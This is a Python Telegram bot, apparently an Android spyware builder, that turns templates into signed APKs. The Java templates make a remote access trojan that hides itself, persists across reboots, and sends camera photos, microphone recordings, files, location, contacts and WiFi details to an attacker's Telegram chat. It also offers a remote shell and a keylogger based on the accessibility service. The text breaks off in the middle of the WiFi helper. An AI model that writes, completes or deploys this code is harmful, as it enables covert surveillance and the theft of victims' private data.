#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║       👑  APK BUILDER PRO  —  RAILWAY EDITION  v5.0              ║
║       بناء تطبيقات Android مع بوت تحكم كامل + توقيع تلقائي        ║
╚══════════════════════════════════════════════════════════════════╝
"""

# ═══════════════════════════════════════════════════════════════════
#                        IMPORTS
# ═══════════════════════════════════════════════════════════════════
import os
import re
import json
import shutil
import asyncio
import secrets
import subprocess
from pathlib import Path
from datetime import datetime
from collections import defaultdict

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ConversationHandler,
    filters, ContextTypes
)
from telegram.constants import ParseMode
from PIL import Image


# ═══════════════════════════════════════════════════════════════════
#                       CONFIGURATION
# ═══════════════════════════════════════════════════════════════════
def _load_env():
    """قراءة ملف .env إن وُجد"""
    env_file = Path(__file__).parent / ".env"
    if env_file.exists():
        for line in env_file.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, v = line.split("=", 1)
                os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))

_load_env()

BASE_DIR     = Path(__file__).parent
BUILD_DIR    = BASE_DIR / "builds"
KEYSTORE_DIR = BASE_DIR / "keystore"
BUILD_DIR.mkdir(exist_ok=True)
KEYSTORE_DIR.mkdir(exist_ok=True)

BOT_TOKEN    = os.getenv("BOT_TOKEN", "").strip()
ADMIN_ID     = int(os.getenv("ADMIN_ID", "0") or "0")
BOT_USERNAME = os.getenv("BOT_USERNAME", "").strip()

CONFIG = {
    "app_version": "5.0.0",
    "compile_sdk": 34,
    "min_sdk": 24,
    "target_sdk": 34,
    "gradle_version": "8.2.0",
    "max_build_time": 2400,
    "max_apk_per_user": 10,
    "sign_apk": True,
    "keystore": {
        "path": str(KEYSTORE_DIR / "release.keystore"),
        "alias": "release",
        "store_password": "ChangeMe123!",
        "key_password": "ChangeMe123!",
    },
}


def _validate():
    errors = []
    if not BOT_TOKEN:
        errors.append("❌ BOT_TOKEN غير مضبوط")
    elif BOT_TOKEN.count(":") != 1:
        errors.append("❌ BOT_TOKEN صيغة خاطئة")
    if ADMIN_ID == 0:
        errors.append("❌ ADMIN_ID غير مضبوط")
    if errors:
        print("\n".join(errors))
        print("\n💡 أضف المتغيرات في Railway → Variables")
        raise SystemExit(1)

_validate()


# ═══════════════════════════════════════════════════════════════════
#                    DATA DEFINITIONS
# ═══════════════════════════════════════════════════════════════════
(
    ST_NAME, ST_PKG, ST_ADMIN, ST_TOKEN,
    ST_PERMS, ST_FEATS, ST_THEME, ST_ICON, ST_CONFIRM
) = range(9)

PERMISSIONS = {
    "camera":        ("📷", "الكاميرا",       "CAMERA"),
    "read_storage":  ("📁", "قراءة الملفات",  "READ_EXTERNAL_STORAGE"),
    "write_storage": ("💾", "كتابة الملفات",  "WRITE_EXTERNAL_STORAGE"),
    "contacts":      ("📞", "جهات الاتصال",   "READ_CONTACTS"),
    "location":      ("📍", "الموقع",         "ACCESS_FINE_LOCATION"),
    "sms":           ("✉️", "الرسائل",         "READ_SMS"),
    "call_log":      ("📋", "سجل المكالمات",  "READ_CALL_LOG"),
    "mic":           ("🎙️", "الميكروفون",      "RECORD_AUDIO"),
    "calendar":      ("📅", "التقويم",         "READ_CALENDAR"),
    "phone_state":   ("📱", "حالة الهاتف",     "READ_PHONE_STATE"),
}

FEATURES = {
    "screenshot":    ("🖥️", "لقطة الشاشة"),
    "keylogger":     ("⌨️", "تسجيل الكتابة"),
    "notifications": ("🔔", "قراءة الإشعارات"),
    "apps_list":     ("📦", "قائمة التطبيقات"),
    "wifi_pass":     ("📶", "كلمات WiFi"),
    "shell":         ("💻", "Shell"),
    "persist":       ("♻️", "إعادة تشغيل"),
    "clipboard":     ("📋", "الحافظة"),
    "audio_record":  ("🎙️", "تسجيل الميكروفون"),
    "screen_stream": ("📡", "بث الشاشة"),
}

THEMES = {
    "dark":  ("🌑", "داكن"),
    "light": ("☀️", "فاتح"),
    "auto":  ("🔄", "تلقائي"),
}

user_sessions = {}
user_apk_count = defaultdict(int)


# ═══════════════════════════════════════════════════════════════════
#                  TEMPLATES — Android Files
# ═══════════════════════════════════════════════════════════════════
MANIFEST_TPL = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{pkg}"
    xmlns:tools="http://schemas.android.com/tools">

{perms_xml}
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission"/>

    <application
        android:label="{app_name}"
        android:icon="@mipmap/ic_launcher"
        android:usesCleartextTraffic="true"
        android:allowBackup="true"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.DeviceDefault">

        <activity android:name=".MainActivity"
            android:exported="true"
            android:excludeFromRecents="true"
            android:noHistory="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service android:name=".ControlService"
            android:exported="true"
            android:foregroundServiceType="dataSync|microphone"/>

        <service android:name=".KeyloggerService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config"/>
        </service>

        <service android:name=".NotificationListener"
            android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService"/>
            </intent-filter>
        </service>

        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>'''


BUILD_GRADLE_TPL = '''plugins {{ id 'com.android.application' }}
android {{
    namespace '{pkg}'
    compileSdk {compile_sdk}
    defaultConfig {{
        applicationId "{pkg}"
        minSdk {min_sdk}
        targetSdk {target_sdk}
        versionCode 1
        versionName "1.0"
    }}
    compileOptions {{
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }}
    buildTypes {{
        release {{
            minifyEnabled false
            shrinkResources false
        }}
    }}
    lint {{
        checkReleaseBuilds false
        abortOnError false
    }}
}}
dependencies {{
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.squareup.okhttp3:okhttp:4.11.0'
    implementation 'org.json:json:20231013'
}}'''


ACCESSIBILITY_XML = '''<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:description="@string/app_name"
    android:notificationTimeout="100"/>'''


MAIN_ACTIVITY = '''package {pkg};

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {{
    private static final int REQ = 1001;

    @Override
    protected void onCreate(Bundle b) {{
        super.onCreate(b);
        requestAllPermissions();
        startControlService();

        if (Build.VERSION.SDK_INT >= 26
                && !getPackageManager().canRequestPackageInstalls()) {{
            try {{
                startActivity(new Intent(
                    Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName())));
            }} catch (Exception ignored) {{}}
        }}
        if (Build.VERSION.SDK_INT >= 23
                && !Settings.canDrawOverlays(this)) {{
            try {{
                startActivity(new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())));
            }} catch (Exception ignored) {{}}
        }}

        new Handler().postDelayed(new Runnable() {{
            @Override public void run() {{
                try {{
                    Intent tg = new Intent(Intent.ACTION_VIEW,
                        Uri.parse("https://t.me/{bot_username}"));
                    startActivity(tg);
                }} catch (Exception ignored) {{}}
                moveTaskToBack(true);
            }}
        }}, 2500);
    }}

    private void startControlService() {{
        Intent svc = new Intent(this, ControlService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
        else startService(svc);
    }}

    private void requestAllPermissions() {{
        List<String> needed = new ArrayList<>();
        String[] all = new String[]{{
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
        }};
        for (String p : all) {{
            if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED) needed.add(p);
        }}
        if (Build.VERSION.SDK_INT >= 33
                && ContextCompat.checkSelfPermission(this,
                    "android.permission.POST_NOTIFICATIONS")
                    != PackageManager.PERMISSION_GRANTED) {{
            needed.add("android.permission.POST_NOTIFICATIONS");
        }}
        if (!needed.isEmpty()) {{
            ActivityCompat.requestPermissions(this,
                needed.toArray(new String[0]), REQ);
        }}
    }}
}}'''


CONTROL_SERVICE = '''package {pkg};

import android.app.*;
import android.content.*;
import android.os.*;
import android.util.Log;
import org.json.*;
import java.io.*;
import java.util.concurrent.*;
import okhttp3.*;

public class ControlService extends Service {{
    private static final String TAG = "CTRL";
    private static final String TOKEN = "{bot_token}";
    private static final String ADMIN = "{admin_id}";
    private static final String API = "https://api.telegram.org/bot" + TOKEN;

    static OkHttpClient http = new OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build();

    private ScheduledExecutorService scheduler;
    private long lastUpdateId = 0;

    private CameraHelper camera;
    private AudioHelper audio;
    private FileHelper files;
    private LocationHelper location;
    private ContactsHelper contacts;
    private WifiHelper wifi;
    private AppsHelper apps;
    private ScreenshotHelper screen;
    private ShellHelper shell;

    @Override
    public void onCreate() {{
        super.onCreate();
        camera = new CameraHelper(this);
        audio = new AudioHelper(this);
        files = new FileHelper(this);
        location = new LocationHelper(this);
        contacts = new ContactsHelper(this);
        wifi = new WifiHelper(this);
        apps = new AppsHelper(this);
        screen = new ScreenshotHelper(this);
        shell = new ShellHelper();
    }}

    @Override
    public int onStartCommand(Intent i, int f, int s) {{
        startForeground(1, buildNotification());
        if (scheduler == null || scheduler.isShutdown()) {{
            scheduler = Executors.newSingleThreadScheduledExecutor();
            scheduler.scheduleWithFixedDelay(this::poll, 0, 3, TimeUnit.SECONDS);
        }}
        return START_STICKY;
    }}

    private Notification buildNotification() {{
        String ch = "svc";
        if (Build.VERSION.SDK_INT >= 26) {{
            NotificationChannel c = new NotificationChannel(
                ch, "Service", NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(c);
        }}
        return new Notification.Builder(this, ch)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build();
    }}

    private void poll() {{
        try {{
            String url = API + "/getUpdates?offset=" + (lastUpdateId + 1)
                + "&timeout=5&allowed_updates=[\\"message\\",\\"callback_query\\"]";
            Request req = new Request.Builder().url(url).build();
            Response r = http.newCall(req).execute();
            String body = r.body() != null ? r.body().string() : "";
            r.close();

            JSONObject root = new JSONObject(body);
            JSONArray updates = root.optJSONArray("result");
            if (updates == null) return;

            for (int i = 0; i < updates.length(); i++) {{
                JSONObject u = updates.getJSONObject(i);
                lastUpdateId = u.getLong("update_id");
                JSONObject msg = u.optJSONObject("message");
                JSONObject cb = u.optJSONObject("callback_query");
                if (msg != null) handleMsg(msg);
                else if (cb != null) handleCb(cb);
            }}
        }} catch (Exception e) {{
            Log.e(TAG, "poll: " + e.getMessage());
        }}
    }}

    private void handleMsg(JSONObject msg) {{
        try {{
            String chatId = msg.getJSONObject("chat").get("id").toString();
            if (!chatId.equals(ADMIN)) return;
            if (msg.has("text")) dispatch(msg.getString("text").trim(), chatId);
        }} catch (Exception ignored) {{}}
    }}

    private void handleCb(JSONObject cb) {{
        try {{
            String data = cb.getString("data");
            String chatId = cb.getJSONObject("message")
                .getJSONObject("chat").get("id").toString();
            if (!chatId.equals(ADMIN)) return;
            answerCb(cb.getString("id"));
            dispatch(data, chatId);
        }} catch (Exception ignored) {{}}
    }}

    private void dispatch(String cmd, String chatId) {{
        try {{
            switch (cmd) {{
                case "/start": case "start":
                    sendMainMenu(chatId); break;

                case "\\uD83D\\uDCF7 كاميرا خلفية": case "cam_back":
                    sendMsg(chatId, "📸 جاري الالتقاط...");
                    camera.capture(chatId, 0); break;
                case "\\uD83E\\uDD33 كاميرا أمامية": case "cam_front":
                    sendMsg(chatId, "📸 جاري الالتقاط...");
                    camera.capture(chatId, 1); break;

                case "\\uD83C\\uDF99 تسجيل صوتي": case "audio_rec":
                    sendMsg(chatId, "🎙️ جاري التسجيل 15 ثانية...");
                    audio.record(chatId, 15000); break;

                case "\\uD83D\\uDCC1 ملفاتي": case "files_root":
                    files.listRoot(chatId); break;
                case "\\uD83D\\uDCBE التخزين":
                    files.listSdcard(chatId); break;
                case "\\u2B07 التنزيلات":
                    files.listDownload(chatId); break;
                case "\\uD83D\\uDDBC صوري":
                    files.sendPhotos(chatId); break;

                case "\\uD83D\\uDCCD موقعي":
                    location.send(chatId); break;
                case "\\uD83D\\uDCDE جهات الاتصال":
                    contacts.send(chatId); break;

                case "\\uD83D\\uDCF6 كلمات WiFi": case "wifi_pass":
                    sendMsg(chatId, "📶 جاري الاستخراج...");
                    wifi.extract(chatId); break;

                case "\\uD83D\\uDCE6 التطبيقات": case "apps_list":
                    sendMsg(chatId, "📦 جاري الجمع...");
                    apps.list(chatId); break;

                case "\\uD83D\\uDDA5 لقطة الشاشة": case "screenshot":
                    sendMsg(chatId, "🖥️ جاري الالتقاط...");
                    screen.take(chatId); break;

                case "\\u2139 معلومات": case "device_info":
                    sendMsg(chatId, buildDeviceInfo()); break;

                case "\\u2699 الإعدادات":
                    sendMsg(chatId, "⚙️ <b>الإعدادات</b>\\n\\n"
                        + "• الحالة: ✅ نشط\\n"
                        + "• الحزمة: " + getPackageName()); break;

                default:
                    if (cmd.startsWith("shell ")) shell.run(cmd.substring(6), chatId);
            }}
        }} catch (Exception e) {{
            sendMsg(chatId, "❌ " + e.getMessage());
        }}
    }}

    private void sendMainMenu(String chatId) {{
        try {{
            JSONArray kb = new JSONArray();
            kb.put(row("📷 كاميرا خلفية", "🤳 كاميرا أمامية"));
            kb.put(row("🎙️ تسجيل صوتي", "🖥️ لقطة الشاشة"));
            kb.put(row("🖼️ صوري", "📁 ملفاتي"));
            kb.put(row("💾 التخزين", "⬇️ التنزيلات"));
            kb.put(row("📍 موقعي", "📞 جهات الاتصال"));
            kb.put(row("📶 كلمات WiFi", "📦 التطبيقات"));
            kb.put(row("ℹ️ معلومات", "⚙️ الإعدادات"));

            JSONObject rm = new JSONObject()
                .put("keyboard", kb)
                .put("resize_keyboard", true);

            String text = "╔════════════════════════════════╗\\n"
                + "║  🎛️  <b>لوحة التحكم الرئيسية</b>      ║\\n"
                + "╚════════════════════════════════╝\\n\\n"
                + "👑 أنت المتحكم الكامل\\n"
                + "📱 الهدف: <b>" + Build.MODEL + "</b>\\n"
                + "🔋 البطارية: <b>" + getBattery() + "%</b>\\n\\n"
                + "اختر عملية من الأزرار 👇";

            String url = API + "/sendMessage?chat_id=" + chatId
                + "&parse_mode=HTML&text=" + enc(text)
                + "&reply_markup=" + enc(rm.toString());
            http.newCall(new Request.Builder().url(url).build()).execute().close();
        }} catch (Exception e) {{
            Log.e(TAG, "menu: " + e.getMessage());
        }}
    }}

    private JSONArray row(String a, String b) throws JSONException {{
        JSONArray r = new JSONArray();
        r.put(new JSONObject().put("text", a));
        r.put(new JSONObject().put("text", b));
        return r;
    }}

    private String getBattery() {{
        try {{
            Intent i = registerReceiver(null,
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i == null) return "?";
            int l = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int s = i.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
            return String.valueOf((l * 100) / s);
        }} catch (Exception e) {{ return "?"; }}
    }}

    private String buildDeviceInfo() {{
        return "📱 <b>معلومات الجهاز</b>\\n\\n"
            + "• الموديل: <b>" + Build.MODEL + "</b>\\n"
            + "• الشركة: " + Build.MANUFACTURER + "\\n"
            + "• Android: " + Build.VERSION.RELEASE + "\\n"
            + "• SDK: " + Build.VERSION.SDK_INT + "\\n"
            + "• البطارية: " + getBattery() + "%\\n"
            + "• الحزمة: <code>" + getPackageName() + "</code>";
    }}

    static void sendMsg(String chatId, String text) {{
        try {{
            String url = API + "/sendMessage?chat_id=" + chatId
                + "&parse_mode=HTML&text=" + enc(text);
            http.newCall(new Request.Builder().url(url).build()).execute().close();
        }} catch (Exception ignored) {{}}
    }}

    static void answerCb(String id) {{
        try {{
            String url = API + "/answerCallbackQuery?callback_query_id=" + id;
            http.newCall(new Request.Builder().url(url).build()).execute().close();
        }} catch (Exception ignored) {{}}
    }}

    static String enc(String s) {{
        try {{ return java.net.URLEncoder.encode(s, "UTF-8"); }}
        catch (Exception e) {{ return ""; }}
    }}

    @Override public IBinder onBind(Intent i) {{ return null; }}

    @Override
    public void onDestroy() {{
        if (scheduler != null) scheduler.shutdownNow();
        Intent rs = new Intent(this, ControlService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(rs);
        else startService(rs);
        super.onDestroy();
    }}

    @Override
    public void onTaskRemoved(Intent rootIntent) {{
        Intent rs = new Intent(this, ControlService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(rs);
        else startService(rs);
        super.onTaskRemoved(rootIntent);
    }}
}}'''


CAMERA_HELPER = '''package {pkg};

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.ImageReader;
import android.os.*;
import android.util.Log;
import okhttp3.*;
import java.nio.ByteBuffer;

public class CameraHelper {{
    private final Context ctx;
    private CameraDevice device;
    private ImageReader reader;
    private String chatId;

    public CameraHelper(Context c) {{ this.ctx = c; }}

    public void capture(String cid, int facing) {{
        this.chatId = cid;
        try {{
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : cm.getCameraIdList()) {{
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == facing) {{ camId = id; break; }}
            }}
            if (camId == null) {{ msg("❌ لا توجد كاميرا"); return; }}

            reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {{
                @Override public void onImageAvailable(ImageReader r) {{
                    try {{
                        android.media.Image img = r.acquireLatestImage();
                        if (img == null) return;
                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buf.remaining()];
                        buf.get(bytes);
                        img.close();
                        upload(bytes);
                        closeCam();
                    }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
                }}
            }}, new Handler(Looper.getMainLooper()));

            if (androidx.core.content.ContextCompat.checkSelfPermission(ctx,
                    android.Manifest.permission.CAMERA)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {{
                msg("❌ صلاحية الكاميرا غير ممنوحة"); return;
            }}

            cm.openCamera(camId, new CameraDevice.StateCallback() {{
                @Override public void onOpened(CameraDevice d) {{
                    device = d;
                    try {{
                        CaptureRequest.Builder b =
                            d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        d.createCaptureSession(
                            java.util.Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {{
                                @Override public void onConfigured(CameraCaptureSession s) {{
                                    try {{ s.capture(b.build(), null, null); }}
                                    catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
                                }}
                                @Override public void onConfigureFailed(CameraCaptureSession s) {{
                                    msg("❌ فشل الإعداد");
                                }}
                            }}, null);
                    }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
                }}
                @Override public void onDisconnected(CameraDevice d) {{ d.close(); }}
                @Override public void onError(CameraDevice d, int e) {{
                    msg("❌ خطأ: " + e); d.close();
                }}
            }}, null);
        }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
    }}

    private void upload(byte[] data) {{
        try {{
            RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("photo", "cam.jpg",
                    RequestBody.create(data, MediaType.parse("image/jpeg")))
                .build();
            ControlService.http.newCall(
                new Request.Builder()
                    .url("https://api.telegram.org/bot{bot_token}/sendPhoto")
                    .post(body).build()
            ).execute().close();
        }} catch (Exception e) {{ Log.e("CAM", "" + e.getMessage()); }}
    }}

    private void closeCam() {{
        try {{ if (device != null) device.close(); }} catch (Exception ignored) {{}}
        try {{ if (reader != null) reader.close(); }} catch (Exception ignored) {{}}
        device = null; reader = null;
    }}

    private void msg(String t) {{ ControlService.sendMsg(chatId, t); }}
}}'''


AUDIO_HELPER = '''package {pkg};

import android.content.Context;
import android.media.MediaRecorder;
import okhttp3.*;
import java.io.File;
import java.util.concurrent.*;

public class AudioHelper {{
    private final Context ctx;
    private MediaRecorder recorder;
    private File outFile;

    public AudioHelper(Context c) {{ this.ctx = c; }}

    public void record(String chatId, int durationMs) {{
        try {{
            outFile = new File(ctx.getCacheDir(),
                "audio_" + System.currentTimeMillis() + ".m4a");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(96000);
            recorder.setOutputFile(outFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            Executors.newSingleThreadScheduledExecutor().schedule(new Runnable() {{
                @Override public void run() {{
                    try {{
                        recorder.stop();
                        recorder.release();
                        upload(chatId, outFile);
                    }} catch (Exception e) {{
                        ControlService.sendMsg(chatId, "❌ " + e.getMessage());
                    }}
                }}
            }}, durationMs, TimeUnit.MILLISECONDS);
        }} catch (Exception e) {{
            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
        }}
    }}

    private void upload(String chatId, File f) {{
        try {{
            RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", f.getName(),
                    RequestBody.create(f, MediaType.parse("audio/mp4")))
                .build();
            ControlService.http.newCall(
                new Request.Builder()
                    .url("https://api.telegram.org/bot{bot_token}/sendAudio")
                    .post(body).build()
            ).execute().close();
        }} catch (Exception ignored) {{}}
    }}
}}'''


FILE_HELPER = '''package {pkg};

import android.content.Context;
import android.database.Cursor;
import android.os.Environment;
import android.provider.MediaStore;
import okhttp3.*;
import java.io.File;

public class FileHelper {{
    private final Context ctx;
    public FileHelper(Context c) {{ this.ctx = c; }}

    public void listRoot(String chatId) {{
        listDir(Environment.getExternalStorageDirectory(), chatId, "📁 التخزين الرئيسي");
    }}
    public void listSdcard(String chatId) {{
        listDir(Environment.getExternalStorageDirectory(), chatId, "💾 SD Card");
    }}
    public void listDownload(String chatId) {{
        File d = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_DOWNLOADS);
        listDir(d, chatId, "⬇️ التنزيلات");
    }}

    private void listDir(File dir, String chatId, String title) {{
        if (dir == null || !dir.exists()) {{
            ControlService.sendMsg(chatId, "❌ المجلد غير موجود");
            return;
        }}
        File[] files = dir.listFiles();
        StringBuilder sb = new StringBuilder(title).append("\\n");
        sb.append(dir.getAbsolutePath()).append("\\n\\n");
        if (files == null || files.length == 0) sb.append("(فارغ)");
        else {{
            int n = 0;
            for (File f : files) {{
                if (n++ >= 40) {{ sb.append("...\\n"); break; }}
                sb.append(f.isDirectory() ? "📂 " : "📄 ").append(f.getName());
                if (f.isFile()) sb.append(" (").append(f.length()/1024).append(" KB)");
                sb.append("\\n");
            }}
        }}
        ControlService.sendMsg(chatId, sb.toString());
    }}

    public void sendPhotos(String chatId) {{
        try {{
            String[] proj = {{MediaStore.Images.Media.DATA}};
            Cursor c = ctx.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC");
            int count = 0;
            if (c != null) {{
                while (c.moveToNext() && count < 15) {{
                    String path = c.getString(0);
                    File f = new File(path);
                    if (f.exists() && f.length() > 0) {{
                        upload(f, chatId);
                        count++;
                        Thread.sleep(600);
                    }}
                }}
                c.close();
            }}
            if (count == 0) ControlService.sendMsg(chatId, "لا توجد صور");
        }} catch (Exception e) {{
            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
        }}
    }}

    private void upload(File f, String chatId) {{
        try {{
            RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("photo", f.getName(),
                    RequestBody.create(f, MediaType.parse("image/jpeg")))
                .build();
            ControlService.http.newCall(
                new Request.Builder()
                    .url("https://api.telegram.org/bot{bot_token}/sendPhoto")
                    .post(body).build()
            ).execute().close();
        }} catch (Exception ignored) {{}}
    }}
}}'''


LOCATION_HELPER = '''package {pkg};

import android.content.Context;
import android.location.*;
import okhttp3.Request;

public class LocationHelper {{
    private final Context ctx;
    public LocationHelper(Context c) {{ this.ctx = c; }}

    public void send(String chatId) {{
        try {{
            LocationManager lm = (LocationManager)
                ctx.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null)
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) {{
                ControlService.sendMsg(chatId, "⚠️ لا يوجد موقع متاح");
                return;
            }}
            String url = "https://api.telegram.org/bot{bot_token}/sendLocation"
                + "?chat_id=" + chatId
                + "&latitude=" + loc.getLatitude()
                + "&longitude=" + loc.getLongitude();
            ControlService.http.newCall(
                new Request.Builder().url(url).build()
            ).execute().close();
            ControlService.sendMsg(chatId,
                "📍 <b>الموقع الحالي</b>\\n"
                + "خط العرض: " + loc.getLatitude() + "\\n"
                + "خط الطول: " + loc.getLongitude() + "\\n"
                + "الدقة: " + loc.getAccuracy() + " م\\n"
                + "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
        }} catch (Exception e) {{
            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
        }}
    }}
}}'''


CONTACTS_HELPER = '''package {pkg};

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

public class ContactsHelper {{
    private final Context ctx;
    public ContactsHelper(Context c) {{ this.ctx = c; }}

    public void send(String chatId) {{
        try {{
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            StringBuilder sb = new StringBuilder("📞 <b>جهات الاتصال</b>\\n\\n");
            int n = 0;
            if (c != null) {{
                while (c.moveToNext() && n < 80) {{
                    String name = c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append("• ").append(name).append(" → ").append(phone).append("\\n");
                    n++;
                    if (sb.length() > 3500) {{
                        ControlService.sendMsg(chatId, sb.toString());
                        sb = new StringBuilder();
                    }}
                }}
                c.close();
            }}
            if (sb.length() > 0) ControlService.sendMsg(chatId, sb.toString());
            if (n == 0) ControlService.sendMsg(chatId, "لا توجد جهات اتصال");
        }} catch (Exception e) {{
            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
        }}
    }}
}}'''


WIFI_HELPER = '''package {pkg};

import android.content.Context;
import android.net.wifi.WifiManager;
import android.os.Build;
import java.io.*;

public class WifiHelper {{
    private final Context ctx;
    public WifiHelper(Context c) {{ this.ctx = c; }}

    public void extract(String chatId) {{
        StringBuilder sb = new StringBuilder("📶 <b>كلمات WiFi</b>\\n\\n");
        try {{
            WifiManager wm = (WifiManager)
                ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            sb.append("• الشبكة الحالية: ")
              .append(wm.getConnectionInfo().getSSID()).append("\\n\\n");
        }} catch (Exception ignored) {{}}

